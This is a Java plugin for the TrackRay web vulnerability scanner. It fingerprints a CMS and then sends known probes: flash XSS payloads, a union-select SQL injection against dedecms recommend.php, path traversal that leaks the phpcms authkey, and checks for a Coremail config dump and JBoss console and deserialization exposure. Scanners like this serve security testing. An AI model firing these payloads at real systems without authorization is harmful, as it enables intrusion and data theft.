package com.trackray.module.inner;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.enums.FingerPrint;
import com.trackray.base.plugin.InnerPlugin;
import com.trackray.base.utils.SysLog;
import lombok.Builder;
import lombok.Data;
import org.apache.commons.lang3.StringUtils;
import org.apache.http.Header;
import org.javaweb.core.net.HttpRequest;
import org.javaweb.core.net.HttpResponse;
import org.javaweb.core.net.HttpURLRequest;
import us.codecraft.webmagic.utils.HttpConstant;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

@Rule(enable = false)
@Plugin(value = "simpleVulRule" ,title = "简单CMS漏洞检测规则" , author = "浅蓝")
public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
    private String target;
    private List<Vulnerable> vulns = new ArrayList<>();

    private List<Payloader> doSwitch(FingerPrint finger) {
        List<Payloader> loaders = new ArrayList<>();
        switch (finger) {
            case $phpcms:

                loaders.add(
                        Payloader.builder()
                        .url("/statics/js/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(1)}}//")
                        .custom(new Custom() {
                            @Override
                            public boolean fun(HttpResponse response) throws Exception {
                                if (    response!=null &&
                                        response.getStatusCode() == 200 &&
                                        response.getContentType().contains("flash")){
                                    return true;
                                }
                                return false;
                            }
                        })
                        .vuln(
                                Vulnerable.builder()
                                .type(Vulnerable.Type.XSS.getType())
                                .level(Vulnerable.Level.HIGH.getLevel())
                                .title("phpcms v9 swfupload.swf flash xss").build()
                        )
                        .build()
                );

                loaders.add(
                        Payloader.builder()
                                .url("/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\\\"))}catch(e){alert(1)}%2f%2f")
                                .custom(new Custom() {
                                    @Override
                                    public boolean fun(HttpResponse response) throws Exception {
                                        if (    response!=null &&
                                                response.getStatusCode() == 200 &&
                                                response.getContentType().contains("flash")){
                                            return true;
                                        }
                                        return false;
                                    }
                                })
                                .vuln(
                                        Vulnerable.builder()
                                                .type(Vulnerable.Type.XSS.getType())
                                                .level(Vulnerable.Level.HIGH.getLevel())
                                                .title("phpcms v9 player.swf flash xss").build()
                                )
                                .build()
                );

                loaders.add(
                        Payloader.builder()
                                .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
                                .method(HttpRequest.Method.GET)
                                .containsStr("aaaaa")
                                .vuln(
                                        Vulnerable.builder()
                                                .level(Vulnerable.Level.HIGH.getLevel())
                                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
                                                .title("phpcms authkey泄漏")
                                                .build()) //另一种实现方式
                                .build()
                );

                break;
            case $Discuz:
                break;
            case $dedecms:

                loaders.add(
                        Payloader.builder()
                                .url("/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\' or mid=@`\\'` /*!50000union*//*!50000select*/1,2,3,md5(1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6873")
                                .containsStr("c4ca4238a0b923820dcc509a6f75849b")
                                .vuln(Vulnerable.builder()
                                        .title("dedecms /plus/recommend.php SQL注入漏洞")
                                        .level(Vulnerable.Level.HIGH.getLevel())
                                        .type(Vulnerable.Type.SQL_INJECTION.getType())
                                        .build())
                                .build()
                );
                ///images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert("xss")}}//
                loaders.add(
                        Payloader.builder()
                                .url("/data/mysql_error_trace.inc")
                                .containsStr("<?php")
                                .vuln(
                                        Vulnerable.builder()
                                                .title("dedecms /data/mysql_error_trace.inc 信息泄露")
                                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
                                                .level(Vulnerable.Level.HIGH.getLevel())
                                                .build()
                                )
                                .build()
                );
                loaders.add(
                        Payloader.builder()
                                .url("/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(\"xss\")}}//")
                                .custom(new Custom() {
                                    @Override
                                    public boolean fun(HttpResponse response) throws Exception {
                                        if (    response!=null &&
                                                response.getStatusCode() == 200 &&
                                                response.getContentType().contains("flash")){
                                            return true;
                                        }
                                        return false;
                                    }
                                })
                                .vuln(Vulnerable.builder().title("dedecms 5.7 /swfupload.swf 反射xss")
                                .level(Vulnerable.Level.HIGH.getLevel()).type(Vulnerable.Type.XSS.getType()).build())
                                .build()
                );


                loaders.add(
                        Payloader.builder()
                                .url("/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D")
                                .request(new HttpURLRequest().followRedirects(false).method(HttpRequest.Method.GET))
                                .custom(new Custom() {
                                    @Override
                                    public boolean fun(HttpResponse response) throws Exception {
                                        if (    response!=null &&
                                                response.getStatusCode() == 302 ){
                                            return true;
                                        }
                                        return false;
                                    }
                                })
                                .vuln(Vulnerable.builder().title("dedecms 5.7  /plus/download.php URL重定向漏洞")
                                        .level(Vulnerable.Level.MIDDLE.getLevel()).type(Vulnerable.Type.UNKNOWN.getType()).build())
                                .build()
                );

                break;
            default:
                /**
                 * 以上都没有匹配时执行
                 */
                break;
        }
        /****  通用规则 *****/
        loaders.add(
                Payloader.builder()
                        .url("/crossdomain.xml")
                        .containsStr("domain=\"*\"")
                        .vuln(
                                Vulnerable.
                                        builder().
                                        level(Vulnerable.Level.LOW.getLevel())
                                        .type(Vulnerable.Type.CONFIG_ERROR.getType())
                                        .title("crossdomain.xml 配置不当").build()
                        ).build()
        );

        loaders.add(Payloader.builder()
                .url("/mailsms/s?func=ADMIN:appState&dumpConfig=/")
                .containsStr("/home/coremail")
                .vuln(Vulnerable.builder()
                        .title("Coremail 信息泄露漏洞")
                        .level(Vulnerable.Level.HIGH.getLevel())
                        .type(Vulnerable.Type.INFO_LEAKAGE.getType())
                        .build())
                .build());

        loaders.add(
                Payloader.builder().url("/WebResource.axd?d=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1")
                        .containsStr("Microsoft .NET Framework")
                        .vuln(Vulnerable.builder()
                                .level(Vulnerable.Level.LOW.getLevel())
                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
                                .payload("/WebResource.axd?d=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1")
                                .title("ASP.NET Padding Oracle信息泄露漏洞").build()).build()
        );

        /*************************JBOSS*************************/
        loaders.add(
                Payloader.builder().url("/examples/servlets/index.html")
                        .containsStr("Servlet Examples")
                        .vuln(Vulnerable.builder()
                                .level(Vulnerable.Level.HIGH.getLevel())
                                .type(Vulnerable.Type.UNAUTHORIZED_ACCESS.getType())
                                .title("Tomcat样例信息泄露漏洞").build()).build()
        );

        /*******************************************************/


        /*************************JBOSS*************************/
        loaders.add(
                Payloader.builder().url("/jmx-console/")
                        .containsStr("JMX Agent")
                        .vuln(Vulnerable.builder()
                                .level(Vulnerable.Level.HIGH.getLevel())
                                .type(Vulnerable.Type.UNAUTHORIZED_ACCESS.getType())
                                .title("JBOSS /jmx-console/ 未授权访问").build()).build()
        );
        loaders.add(
                Payloader.builder().url("/web-console/ServerInfo.jsp")
                        .containsStr("JBoss Management")
                        .vuln(Vulnerable.builder()
                                .level(Vulnerable.Level.HIGH.getLevel())
                                .type(Vulnerable.Type.UNAUTHORIZED_ACCESS.getType())
                                .title("JBOSS /web-console/ 未授权访问").build()).build()
        );
        loaders.add(
                Payloader.builder().url("/invoker/readonly/")
                        .containsStr("ObjectInputStream")
                        .vuln(Vulnerable.builder()
                                .level(Vulnerable.Level.HIGH.getLevel())
                                .type(Vulnerable.Type.DESERIALIZE.getType())
                                .title("JBOSSAS 5.x/6.x 反序列化命令执行漏洞 ").build()).build()
        );

        /*******************************************************/


        loaders.add(
                Payloader.builder()
                        .url("/robots.txt")
                        .method(HttpRequest.Method.GET)
                        .custom(
                                new Custom() {
                                    @Override
                                    public boolean fun(HttpResponse response) throws Exception {
                                        String body = response.body();
                                        if (body==null || response.getStatusCode() != 200)
                                            return false;

                                        if (StringUtils.containsAny(body.toLowerCase(),"system","upload","manage","config","admin","install"))
                                            return true;
                                        return false;
                                    }
                                }
                        )
                        .vuln(
                                Vulnerable.builder()
                                        .level(Vulnerable.Level.INFO.getLevel())
                                        .type(Vulnerable.Type.INFO_LEAKAGE.getType())
                                        .title("robots.txt 存在敏感路径")
                                        .build())
                        .build()
        );


        return loaders;
    }

    @Override
    public void before() {
        target = this.task.getTargetStr();
    }

    @Override
    public void process() {
        result = start();
    }

    @Override
    public List<Vulnerable> start() {
        if (null!=(task)){
            FingerPrint finger = task.getResult().getSystemInfo().getFinger();
            if (finger!=null){
                test(doSwitch(finger));
            }
        }
        return vulns;
    }

    @Override
    public void after() {

        if (result!=null){
            for (Vulnerable vulnerable : result) {
                addVulnerable(vulnerable);
            }
        }
    }

    private void test(List<Payloader> payloaders) {
        SysLog.info("符合要求的有"+payloaders.size()+"个简单的漏洞规则");
        for (Payloader payloader : payloaders) {

            HttpURLRequest req = payloader.getRequest();
            try {
                HttpResponse resp = null;
                if (req == null) {
                    req = new HttpURLRequest()
                            .url(target.concat(payloader.url));
                    if (payloader.method !=null){
                        req.method(payloader.method);
                    }else{
                        req.method(HttpRequest.Method.GET);
                    }

                    if (StringUtils.isNotBlank(payloader.data)) {
                        req.data(payloader.data);
                    }

                    if (payloader.header != null) {
                        req.header(payloader.header);
                    }

                    if (req.getMethod() == HttpConstant.Method.GET)
                        resp = req.get();
                    else
                        resp = req.post();

                }else{
                    req.url(target.concat(payloader.url));
                    resp = req.request();
                }


                if (payloader.getCustom()!=null){
                    try {
                        if (payloader.custom.fun( resp )){
                            addVul(payloader);
                        }
                    } catch (Exception e) {
                        task.getExceptions().add(e);
                        continue;
                    }
                }else{


                    if (StringUtils.isNotBlank(payloader.containsStr)){
                        if (StringUtils.contains(resp.body() , payloader.containsStr)){
                            addVul(payloader);
                        }

                    }else if(StringUtils.isNotBlank(payloader.matche)){
                        if (resp.body().matches(payloader.containsStr)){
                            addVul(payloader);
                        }
                    }
                }


            }catch (Exception e){
                task.getExceptions().add(e);
            }


        }
    }
    private void addVul(Payloader payloader){
        payloader.vuln.setAddress(payloader.url);
        payloader.vuln.setPayload(payloader.data);
        vulns.add(payloader.vuln);
    }

    interface Custom{
        public boolean fun(HttpResponse response) throws Exception;
    }

    @Data
    @Builder
    static class Payloader{
        private HttpURLRequest request;
        private String url="";
        private HttpRequest.Method method = HttpRequest.Method.GET;
        private String data="";
        private Map<String,String > header;
        private String containsStr="";  //文字包含匹配
        private String matche = ""; //正则表达式匹配
        private Vulnerable vuln;
        private Custom custom;

    }
}
